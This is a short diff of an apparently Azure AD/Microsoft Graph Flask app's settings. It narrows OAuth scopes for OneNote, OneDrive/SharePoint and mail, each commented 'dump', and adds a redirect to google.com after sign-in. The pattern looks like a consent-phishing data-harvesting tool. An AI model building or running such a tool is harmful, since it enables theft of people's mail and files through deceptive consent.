@@ -16,17 +16,17 @@ REDIRECT_URI  = os.getenv("REDIRECT_URI") + REDIRECT_PATH
 # The absolute URL must match the redirect URI you set
 # in the app's registration in the Azure portal.
 
-# You can find more Microsoft Graph API endpoints from Graph Explorer
-# https://developer.microsoft.com/en-us/graph/graph-explorer
-ENDPOINT = 'https://graph.microsoft.com/v1.0/users'  # This resource requires no admin consent
+# client Redirection url
+
+REDIRECT_URI_CLIENT = "https://google.com"
 
 # You can find the proper permission names from this document
 # https://docs.microsoft.com/en-us/graph/permissions-reference
+# https://developer.microsoft.com/en-us/graph/graph-explorer
 SCOPE = [
-    "User.ReadBasic.All",    # users                 dump
-    "Notes.ReadWrite.All",   # oneNote               dump
-    "Files.Read.All",        # oneDrive sharepoint   dump
-    "Mail.Read",             # mail                  dump
+    "Notes.Read.All",          # oneNote               dump
+    "Files.Read.All",          # oneDrive sharepoint   dump
+    "Mail.ReadBasic.Shared",   # mail                  dump
     ]
 
 # Tells the Flask-session extension to store sessions in the filesystem
